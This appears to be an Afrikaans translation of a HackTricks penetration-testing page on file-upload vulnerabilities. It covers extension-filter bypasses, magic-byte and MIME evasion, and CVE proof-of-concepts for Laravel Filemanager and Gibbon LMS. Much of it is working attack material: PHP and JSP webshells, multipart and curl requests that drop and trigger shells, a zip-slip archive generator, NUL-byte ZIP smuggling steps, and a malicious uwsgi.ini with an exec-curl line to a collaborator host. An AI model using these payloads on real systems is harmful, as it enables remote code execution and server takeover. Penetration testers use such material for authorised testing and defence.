# Lêeroplaai

{{#include ../../banners/hacktricks-training.md}}

## Algemene metodologie vir lêeroplaai

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass kontrole van lêeruitbreidings

1. As hulle van toepassing is, check die vorige uitbreidings. Toets dit ook met sommige **uppercase letters**: _pHp, .pHP5, .PhAr ..._
2. Check om 'n geldige uitbreiding voor die uitvoeringsextensie by te voeg (gebruik ook die vorige uitbreidings):
- _file.png.php_
- _file.png.Php5_
3. Probeer om **spesiale karakters aan die einde** by te voeg. Jy kan Burp gebruik om alle **ascii** en **Unicode** karakters te **bruteforce**. (Let daarop dat jy ook die **vorige** genoemde **uitbreidings** kan probeer)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Probeer die beskerming omseil deur die server-side se extension parser te mislei met tegnieke soos die **doubling** van die **extension** of deur **junk** data (**null** bytes) tussen uitbreidings te plaas. _Jy kan ook die **vorige uitbreidings** gebruik om 'n beter payload voor te berei._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Voeg nog 'n laag uitbreidings by die vorige kontrole:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Probeer die exec-uitbreiding voor die geldige uitbreiding te sit en hoop dat die server verkeerd gekonfigureer is. (nuttig om Apache miskonfigurasies uit te buit waar enigiets met die uitbreiding **.php**, maar nie noodwendig eindigend in .php nie, kode sal uitvoer):
- _ex: file.php.png_
7. Gebruik NTFS alternate data stream (ADS) in Windows. In hierdie geval sal 'n kolon karakter ":" ingesit word na 'n verbode uitbreiding en voor 'n toegelate een. Gevolglik sal 'n **leë lêer met die verbode uitbreiding** op die bediener geskep word (bv. "file.asax:.jpg"). Hierdie lêer kan later met ander tegnieke gewysig word, soos deur sy short filename te gebruik. Die "**::$data**” patroon kan ook gebruik word om nie-leë lêers te skep. Dus kan dit nuttig wees om 'n punt karakter na hierdie patroon by te voeg om verdere beperkinge te omseil (bv. "file.asp::$data.")
8. Probeer die filename limiete breek. Die geldige uitbreiding word afgekap en die kwaadwillige PHP bly oor. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Some upload handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation by:

- Using a valid image MIME and magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Naming the uploaded file with a PHP extension followed by a dot, e.g., `shell.php.`.
- The server strips the trailing dot and persists `shell.php`, which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Roep dan die gestoorde pad aan (tipies in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Omseil Content-Type, Magic Number, Compression & Resizing

- Omseil **Content-Type** kontrole deur die **waarde** van die **Content-Type** **header** te stel op: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **woordlys**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Omseil die **magic number** kontrole deur aan die begin van die lêer die **bytes van 'n werklike image** by te voeg (om die _file_ command te mislei). Of plaas die shell in die **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` of jy kan die payload ook **direk in 'n image inbring**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Indien **compressie by jou image gevoeg word**, byvoorbeeld deur sommige standaard PHP biblioteke soos [PHP-GD](https://www.php.net/manual/fr/book.image.php), sal die vorige tegnieke nie nuttig wees nie. Jy kan egter die **PLTE chunk** [**tegniek beskryf hier**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **compressie sal oorleef**.
- [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die webblad kan ook die **image hergroot** wees, byvoorbeeld deur die PHP-GD funksies `imagecopyresized` of `imagecopyresampled` te gebruik. Jy kan egter die **IDAT chunk** [**tegniek beskryf hier**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **compressie sal oorleef**.
- [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Nog 'n tegniek om 'n payload te maak wat **hergroting van 'n image oorleef**, met die PHP-GD funksie `thumbnailImage`. Jy kan egter die **tEXt chunk** [**tegniek beskryf hier**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **compressie sal oorleef**.
- [**Github met die kode**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Ander truuks om te kontroleer

- Vind 'n kwesbaarheid om die reeds opgelaaide lêer te **hernoem** (om die uitbreiding te verander).
- Vind 'n **Local File Inclusion** kwesbaarheid om die backdoor uit te voer.
- **Moontlike inligtingsopenbaarmaking**:
1. Laai dieselfde lêer **verskeie kere** op (en op presies die **selfde tyd**) met dieselfde naam.
2. Laai 'n lêer op met die **naam** van 'n **lêer** of **gids** wat **alreeds bestaan**.
3. Laai 'n lêer op met **"." , "..", of "…" as sy naam**. Byvoorbeeld, in Apache op **Windows**, as die toepassing die opgelaaide lêers in die "/www/uploads/" gids stoor, sal die "." lêernaam 'n lêer genaamd uploads” in die "/www/" gids skep.
4. Laai 'n lêer op wat nie maklik uitgevee kan word nie, soos **"…:.jpg"** in **NTFS**. (Windows)
5. Laai 'n lêer op in **Windows** met **ongeldige karakters** soos `|<>*?”` in die naam. (Windows)
6. Laai 'n lêer op in **Windows** met **gereserveerde** (**verbode**) **name** soos CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, en LPT9.
- Probeer ook om 'n **uitvoerbare lêer** (.exe) of 'n **.html** (minder verdag) op te laai wat **kode sal uitvoer** wanneer per ongeluk deur 'n slagoffer oopgemaak.

### Spesiale uitbreidingstruuks

As jy lêers na 'n **PHP server** probeer oplaai, [kyk na die **.htaccess** truuk om kode uit te voer](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
As jy lêers na 'n **ASP server** probeer oplaai, [kyk na die **.config** truuk om kode uit te voer](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` lêers is soos die `.jar` vir java, maar vir php, en kan **soos 'n php lêer gebruik word** (uitvoerende dit met php, of dit include in 'n skrip...).

Die `.inc` uitbreiding word soms vir php lêers gebruik wat slegs gebruik word om **lêers te importeer**, dus kan dit wees dat iemand hierdie uitbreiding toegelaat het om **uitgevoer te word**.

## **Jetty RCE**

As jy 'n XML-lêer na 'n Jetty server kan oplaai, kan jy [RCE verkry omdat **nuwe *.xml en *.war outomaties verwerk word**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Soos in die volgende beeld genoem, laai die XML-lêer op na `$JETTY_BASE/webapps/` en verwag die shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Vir 'n gedetaileerde verkenning van hierdie kwesbaarheid, sien die oorspronklike navorsing: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) kwesbaarhede kan uitgebuit word op uWSGI servers indien iemand die vermoë het om die `.ini` konfigurasielêer te wysig. uWSGI konfigurasielêers gebruik 'n spesifieke sintaksis om "magic" veranderlikes, placeholders en operators in te voeg. Opvallend is die '@' operator, wat as `@(filename)` gebruik word om die inhoud van 'n lêer in te sluit. Onder die verskeie ondersteunede skemas in uWSGI is die "exec" skema besonder kragtig, aangesien dit toelaat om data vanaf 'n proses se standaarduitset te lees. Hierdie funksionaliteit kan misbruik word vir kwaadwillige doeleindes soos Remote Command Execution of Arbitrary File Write/Read wanneer 'n `.ini` konfigurasielêer verwerk word.

Oorweeg die volgende voorbeeld van 'n kwaadwillige `uwsgi.ini` lêer, wat verskeie skemas demonstreer:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die uitvoering van die payload gebeur tydens die parsing van die konfigurasielêer. Om die konfigurasie geaktiveer en geparse te kry, moet die uWSGI-proses óf herbegin word (moontlik na 'n crash of weens 'n Denial of Service-aanval) óf die lêer moet op auto-reload gestel word. Die auto-reload-funksie, indien geaktiveer, herlaai die lêer op gespesifiseerde intervalle wanneer veranderinge gedetecteer word.

Dit is noodsaaklik om die los aard van uWSGI se konfigurasielêer-parsing te verstaan. Spesifiek kan die genoemde payload in 'n binêre lêer ingevoeg word (soos 'n beeld of PDF), wat die omvang van moontlike eksploitasie verder vergroot.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Ongeauthentiseerde endpoint in Gibbon LMS maak arbitrary file write binne die web root moontlik, wat lei tot pre-auth RCE deur 'n PHP-lêer neer te sit. Kwesbare weergawes: tot en met 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC om 'n lêer te skryf en terug te lees:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Laat 'n minimale webshell val en voer opdragte uit:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Aantekeninge:
- Die handler voer `base64_decode($_POST["img"])` uit nadat dit volgens `;` en `,` gesplit is, en skryf dan bytes na `$absolutePath . '/' . $_POST['path']` sonder om uitbreiding/tipe te valideer.
- Die resulterende kode loop as die webdiensgebruiker (bv. XAMPP Apache on Windows).

Verwysings vir hierdie fout sluit die usd HeroLab advisory en die NVD entry in. Sien die References afdeling hieronder.

## **wget File Upload/SSRF Trick**

In sekere gevalle sal jy vind dat 'n server **`wget`** gebruik om **lêers af te laai** en jy kan die **URL** aandui. In sulke gevalle kan die kode nagaan dat die uitbreiding van die afgelaaide lêers binne 'n whitelist is om te verseker dat slegs toegelate lêers afgelaai word. **Hierdie check kan egter omseil word.**\

Die **maximum** lengte van 'n **filename** in **linux** is **255**, maar **wget** verkort die filenaam tot **236** karakters. Jy kan **download a file called "A"*232+".php"+".gif"**, hierdie filenaam sal die **bypass** van die **check** moontlik maak (soos in hierdie voorbeeld is **".gif"** 'n **valid** uitbreiding) maar `wget` sal die lêer **rename** na **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Noteer dat **'n ander opsie** waaraan jy dalk dink om hierdie kontrole te omseil, is om die **HTTP-bediener na 'n ander lêer te herlei**, sodat die aanvanklike URL die kontrole sal omseil en wget dan die herlei-lêer met die nuwe naam sal aflaai. Dit **sal NIE werk NIE ** **tensy** wget gebruik word met die **parameter** `--trust-server-names` omdat **wget die herlei-deelblad met die naam van die lêer soos in die oorspronklike URL aangedui sal aflaai**.

### Ontsnap uit oplaai-gids via NTFS junctions (Windows)

(Vir hierdie aanval sal jy plaaslike toegang tot die Windows-masjien nodig hê) Wanneer uploads gestoor word in per-gebruiker subgidse op Windows (bv. C:\Windows\Tasks\Uploads\<id>\) en jy beheer die skepping/verwydering van daardie subgids, kan jy dit vervang met 'n directory junction wat na 'n sensitiewe ligging wys (bv. die webroot). Daarna sal opvolgende uploads na die teikenpad geskryf word, wat kode-uitvoering moontlik maak as die teiken server-side code interpreteer.

Voorbeelflow om uploads na XAMPP webroot te herlei:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Aantekeninge
- mklink /J creates an NTFS directory junction (reparse point). Die rekening van die webbediener moet die junction volg en skryfregte in die bestemming hê.
- Dit herlei arbitrêre lêerskrywings; as die bestemming skripte uitvoer (PHP/ASP), word dit RCE.
- Verdedigings: moenie toelaat dat skryfbare upload roots deur 'n aanvaller beheerbaar is onder C:\Windows\Tasks of soortgelyks nie; blokkeer junction creation; valideer extensies aan die server-side; stoor uploads op 'n aparte volume of met deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Sommige upload/ingest handlers skryf die rou request body na 'n filesystem path wat uit user-controlled query parameters opgebou word. As die handler ook Content-Encoding: gzip ondersteun en versuim om die destination path te kanoniseer/valideer, kan jy directory traversal kombineer met 'n gzipped payload om arbitrêre bytes in 'n web-served directory te skryf en RCE te verkry (bv. plaas 'n JSP onder Tomcat’s webapps).

Generiese eksploitasiestroom:
- Berei jou server-side payload voor (bv. minimale JSP webshell) en gzip-compress die bytes.
- Stuur 'n POST waar 'n path parameter (bv. token) traversal bevat wat die beoogde gids ontsnap, en file dui die lêernaam aan om te bly. Stel Content-Type: application/octet-stream en Content-Encoding: gzip; die body is die gecomprimeerde payload.
- Blaai na die geskryfde lêer om uitvoering te trigger.

Illustratiewe request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Dan trigger:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notes
- Teikenpaaie wissel per installasie (bv. /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in sommige stacks). Enige web-blootgestelde gids wat JSP uitvoer sal werk.
- Burp Suite’s Hackvertor extension kan 'n korrekte gzip body uit jou payload produseer.
- Dit is 'n suiwer pre-auth arbitrary file write → RCE-patroon; dit berus nie op multipart parsing nie.

Mitigations
- Bepaal upload-bestemmings server-side; vertrou nooit padfragmente van clients nie.
- Kanoniseer en handhaaf dat die opgeloste pad binne 'n allow-listed basismap bly.
- Stoor uploads op 'n nie-uitvoerbare volume en weier script-uitvoering vanaf skryfbare paaie.

## Gereedskap

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is 'n kragtige hulpmiddel ontwerp om Pentesters en Bug Hunters te help met die toetsing van file upload-meganismes. Dit benut verskeie bug bounty-tegnieke om die proses van die identifisering en uitbuiting van kwesbaarhede te vereenvoudig, wat deeglike assesserings van webtoepassings verseker.

### Corrupting upload indices with snprintf quirks (historical)

Sommige legacy upload handlers wat `snprintf()` of soortgelyke funksies gebruik om multi-file arrays uit 'n single-file upload te bou, kan in die verleë geraak word om die `_FILES`-struktuur te vervals. As gevolg van inkonsekwenthede en afkapping in `snprintf()`-gedrag, kan 'n noukeurig saamgestelde enkele upload op die bedienerkant as veelvuldige geïndekseerde lêers verskyn, wat logika wat 'n streng vorm aanvaar verwar (bv. dit as 'n multi-file upload behandel en onveilige takke neem). Al is dit vandag nieserig, duik hierdie “index corruption” patroon af en toe weer op in CTFs en ouer codebases.

## Van File upload na ander kwesbaarhede

- Stel **filename** na `../../../tmp/lol.png` en probeer om 'n **path traversal** te bereik
- Stel **filename** na `sleep(10)-- -.jpg` en jy mag 'n **SQL injection** kan bewerkstellig
- Stel **filename** na `<svg onload=alert(document.domain)>` om 'n XSS te bereik
- Stel **filename** na `; sleep 10;` om sommige command injection te toets (meer [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probeer **different svg payloads** van [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Bekende **ImageTrick** kwesbaarheid](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- As jy die webbediener kan aanwys om 'n beeld vanaf 'n URL te haal, kan jy probeer om 'n [SSRF](../ssrf-server-side-request-forgery/index.html) te misbruik. As hierdie **image** op 'n **publieke** site gestoor gaan word, kan jy ook 'n URL van [https://iplogger.org/invisible/](https://iplogger.org/invisible/) aandui en inligting van elke besoeker steel.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Spesiaal saamgestelde PDFs vir XSS: die [volgende bladsy verduidelik hoe om **PDF data te injekteer om JS-uitvoering te verkry**](../xss-cross-site-scripting/pdf-injection.md). As jy PDFs kan oplaai, kan jy 'n PDF voorberei wat arbitrêre JS sal uitvoer volgens die gegewe aanwysings.
- Laai die \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) inhoud op om te kontroleer of die bediener enige **antivirus** het
- Kontroleer of daar enige **groottebeperking** is wanneer lêers opgelaai word

Hier is 'n top 10 lys van dinge wat jy deur oplaai kan bewerkstellig (van [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magiese Header-bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Raadpleeg [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) vir ander filetypes.

## Zip/Tar-lêer wat outomaties ontpak word by Upload

As jy 'n ZIP kan oplaai wat op die bediener ontpak gaan word, kan jy twee dinge doen:

### Symlink

Laai 'n link op wat soft links na ander lêers bevat; deur dan toegang tot die ontpakte lêers te kry sal jy toegang tot die gekoppelde lêers hê:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekomprimeer in verskillende vouers

Die onverwagte skepping van files in directories tydens decompression is 'n ernstige probleem. Ondanks aanvanklike aanames dat hierdie opstelling moontlik teen OS-level command execution via malicious file uploads sal beskerm, kan die hierarchical compression support en directory traversal capabilities van die ZIP archive format uitgebuit word. Dit stel attackers in staat om beperkings te bypass en uit secure upload directories te escape deur die decompression functionality van die targeted application te manipuleer.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Die utility kan gebruik word soos getoon:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Daarbenewens is die **symlink trick with evilarc** ook 'n opsie. As die doel is om 'n lêer soos `/flag.txt` te teiken, moet 'n symlink na daardie lêer in jou stelsel geskep word. Dit verseker dat evilarc nie foute ervaar tydens sy werking nie.

Hieronder is 'n voorbeeld van Python-kode wat gebruik word om 'n kwaadwillige zip-lêer te skep:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Misbruik van kompressie vir file spraying**

Vir meer besonderhede **kyk na die oorspronklike pos by**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Skep 'n PHP Shell**: PHP-kode is geskryf om opdragte uit te voer wat deur die `$_REQUEST`-veranderlike deurgegee word.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying en die skep van 'n saamgeperste lêer**: Verskeie lêers word geskep en 'n zip-argief word saamgestel wat hierdie lêers bevat.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Wysiging met 'n Hex Editor of vi**: Die name van die lêers binne die zip word verander met vi of 'n hex editor, deur "xxA" na "../" te verander om gidse te deurkruis.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Wanneer 'n backend ZIP-insette valideer met PHP’s ZipArchive maar die ekstraksie na die filesystem skryf met rou name, kan jy 'n ongeldigte uitbreiding smous deur 'n NUL (0x00) in die lêernaamvelde in te voeg. ZipArchive behandel die itemnaam as 'n C‑string en sny dit by die eerste NUL af; die filesystem skryf die volle naam, wat alles ná die NUL weglaat.

Hoëvlak-vloei:
- Bereid 'n legitime container-lêer voor (bv. 'n geldige PDF) wat 'n klein PHP-stub in 'n stream inbed sodat die magic/MIME steeds 'n PDF bly.
- Noem dit soos `shell.php..pdf`, zip dit, en hex‑edit die ZIP local header en central directory filename om die eerste `.` na `.php` met `0x00` te vervang, wat lei tot `shell.php\x00.pdf`.
- Validators wat op ZipArchive staatmaak sal `shell.php .pdf` "sien" en dit toelaat; die extractor skryf `shell.php` na die skyf, wat tot RCE kan lei as die upload folder uitvoerbaar is.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Notas
- Verander BEIDE voorkomste van die lêernaam (lokale en sentrale directory). Sommige tools voeg ook 'n ekstra data descriptor entry by – pas alle name‑velde aan indien teenwoordig.
- Die payload file moet steeds server‑side magic/MIME sniffing deurstaan. Om die PHP in 'n PDF stream in te bed hou die header geldig.
- Werk waar die enum/validation path en die extraction/write path nie saamstem oor string handling nie.

### Gestapelde/geconcateneerde ZIPs (parser‑verskil)

